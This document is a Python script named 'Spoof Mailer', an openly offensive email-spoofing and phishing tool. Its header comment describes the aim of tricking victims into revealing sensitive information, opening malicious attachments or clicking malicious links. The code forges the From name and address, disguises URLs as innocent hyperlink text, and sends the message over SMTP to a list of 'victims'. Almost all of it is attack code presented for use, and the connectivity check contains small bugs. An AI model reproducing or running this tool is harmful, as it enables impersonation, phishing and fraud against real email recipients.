# Versoin: 2.1
# Name: Spoof Mailer
# Author: evilfeonix
# Date: 20 - NOVEMBER - 2024
# Website: www.evilfeonix.com 
# Email: evilfeonix@gmail.com 


######   An Email spoofing tool that enable attackers to sends an email message appearing to come from a trusted source, 
######   Aiming to trick their victims into revealing sensitive information, open a malicious attachment,
######   or prompt in clicking a malicious link that will direct victim to malicious website
  

from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import re, os, sys, time, smtplib, configparser


global message
setup = configparser.ConfigParser()
setup.read('config.ini')
username = setup.get('SMTP', 'user')
password = setup.get('SMTP', 'pass')
SMTPhost = setup.get('SMTP', 'host')
SMTPport = setup.getint('SMTP', 'port')


stop="\033[0m"
red="\033[91;1m"
blue="\033[94;1m"
green="\033[92;1m"
purple="\033[95;1m"


err=f"{blue}[{stop}-{blue}]{red}"
info=f"{blue}[{stop}+{blue}]{green}"
succe=f"{blue}[{stop}√{blue}]{purple}"


def internet():
    try:
        s = socket(AF_NET, SOCK_STREAM)
        s.connect_ex(("www.google.com",80))
        return True
    except Exception:return False


def banner():
    os.system("clear || cls")
    logo = f"""{stop}
 ____ {green}www.evilfeonix.com{stop}  __   __  __       _ _
/ ___| _ __   ___   ___  / _| |  \/  | __ _(_) | ___ _ __
{green}\___ \| '_ \ / _ \ / _ \| |_  | |\/| |/ _` | | |/ _ \ '__|
{green} ___) | |_) | (_) | (_) |  _| | |  | | (_| | | |  __/ |{stop}
|____/| .__/ \___/ \___/|_|   |_|  |_|\__,_|_|_|\___|_|   
      |_|                       {green}  Coded by {stop}-{green} EvilFeonix{stop}
                                                v[{green}2.1{stop}]    
       [+] {green}Subscribe To Our YouTube Channel{stop} [+] {red}    
===========================================================
      {green}Write Your Message and End it with #F30N1X{red}          
===========================================================
{stop}"""
    return logo


def detectLink(msg):
    msgArr = msg.split(' ') if ' ' in msg else msg.split()
    for word in msgArr:
        char = """a-zA-Z0-9!@#$%^&*()_+=-{}";:'<>,./?~`"""
        pattern = r""f"^(https?|ftp)://[^\s]+(>>+[{char}])?+$"""

        if re.match(pattern,word):
            wordArr = word.split('>>')

            try:
                if not re.match(r"^(http|www.|ftp:)+$",wordArr[1][:6-2]):
                    wordArr[1] = wordArr[1].replace("-"," ")  # Insert whitespace while masking URL to form an hypertext
                link = f"""<a href="{wordArr[0]}">{wordArr[1]}</a>"""

            except IndexError:
                link = f"""<a href="{wordArr[0]}">{wordArr[0]}</a>"""
            msg = msg.replace(word,link)
            
    return str(msg)


def mailing():
    while True:
        Do = input(f"{info} Do you want to add any receipient {stop}[{green}Y{stop}/{green}n{stop}]{stop}:{blue} ")

        if not Do.lower() in ['y', 'yes', 'n', 'no']:
            print(f"{err} Invalid Option!{stop}")
            os.sys.exit(1)
        if not Do.lower() in ['y', 'yes']:
            break

        receipient = input(f"{info} Enter victim's email to add:{blue} ")
        receivers.append(receipient)
        
    try:
        print(f"{blue}[{stop}•{blue}]{purple} Starting SMTP Server, Please wait!.")
        smtpServer = smtplib.SMTP_SSL(SMTPhost, SMTPport)
        smtpServer.ehlo()
        # smtpServer.starttls()
        smtpServer.login(username, password)
        
    except Exception as e:
        print(f"{err} {e}...{stop}")
        os.sys.exit()

    senderr=0   # error trackerID   ------_-_-- this help in adding emails to dictionary with thesame key but different id
    received=0  # success trackerID -----/              (e.g key1, key2, ...)
    global message
    message = detectLink(message)
    message = message.replace("\n","<br>")
    Dictionary={"Status":"Victim's Mail",}
    # f=open("message.html","w")
    # f.write(f"<p>{message}</p>")
    # print(message)

    for receipient in receivers:
        msg=MIMEMultipart("alternative")
        msg["From"]=f"{sendnm} <{sender}>"
        msg["To"]=receipient
        msg["Subject"]=subject
        html="<center><h1>"
        html+=f"{subject}"
        html+="</h1></center>"
        html+=f"<p>{message}</p>"
        text_part=MIMEText(message, "plain")
        html_part=MIMEText(html, "html")
        msg.attach(text_part)
        msg.attach(html_part)

        try:
            smtpServer.sendmail(username, receipient, str(msg))
            received+=1
            Dictionary[f"Success{received}"] = receipient
            print(f"{succe} Successfully Send Mail To {receipient}")

        except Exception as e:
            senderr+=1
            Dictionary[f"Failed{senderr}"] = receipient
            print(f"{err} An Error Occured while Sending Mail To {receipient}")
    
    time.sleep(3)
    os.system("clear || cls")
    print(f"    \t{green}Mail Successfully Sent To {received} Of {len(receivers)} Victims")

    if not received == 0:
        print(f"{red}===========================================================")
        for status, email in Dictionary.items():

            if status=="Status":
                print(f"{info}\t{status}\t{red}||{green}\t{email}\t")
            elif "Success" in status:
                print(f"{succe}\t{status[:9-2]}\t{red}||{purple}\t{email}\t")
            elif "Failed" in status:
                print(f"{err}\t{status[:9-3]}\t{red}||{red}\t{email}\t")

    print(f"{red}==========================================================={stop}")
    print(f"    ^_^      {green}Thanks For Using Spoof-Mailer{stop}        ^_^    ")
    print(f"{red}==========================================================={stop}")
    smtpServer.quit()



global message
message = ""
receivers = []
print(banner())
escape = " \r\n "   # useful in line 66, the surrounding whitespace help in splitting
                    # and arranging links perfectly

try:
    if internet():
        print(f"\n{err} Please Check Your Internet Connection{stop}")
        os.sys.exit()

    subject = input(f"{info} Enter message subject:{blue} ")
    print(f"{info} Type in message to send:")

    while True:
        txt  = input(f"{blue}[{stop}•{blue}]{green} >>>{blue} ")
        if ("#F30N1X") in txt:
            break
        message+=f"{txt}{escape}"
            
    os.system("clear || cls")
    print(banner())

    sendnm = input(f"{info} Enter sender full name:{blue} ")
    sender = input(f"{info} Enter sender mail address:{blue} ")
    recipient = input(f"{info} Enter receiver mail address:{blue} ")
    receivers.append(recipient)

    if __name__ == "__main__":
        mailing()
        
except KeyboardInterrupt:
    print()
    print(f"{red}==========================================================={stop}")
    print(f"     {green}Follow Us On Github, Instagram, And X[twitter]{stop}      ")
    print(f"  {green}Contact Us On Our Mail Address, Instagram, Or Facebook{stop} ")
    print(f"{green}Subscribe To Our YouTube Channel For Latest Hacking Tricks{stop}")
    print(f"{red}==========================================================={stop}")
    print(f"    ^_^      {green}Thanks For Using Spoof-Mailer{stop}        ^_^    ")
    print(f"{red}==========================================================={stop}")
    os.sys.exit()

